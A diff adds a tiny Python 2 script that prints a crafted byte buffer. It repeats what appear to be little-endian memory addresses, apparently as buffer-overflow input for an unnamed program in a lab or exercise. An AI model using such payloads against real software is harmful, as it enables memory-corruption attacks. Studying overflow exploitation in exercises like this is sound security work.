@@ -1,0 +1,8 @@
+#! /usr/bin/python
+
+buf = '\x3c\xd7\xdf\x9f' + \
+    '\x7f\xdf\xdf\x9f'*15
+overchar = 8
+
+print buf + '8'
+
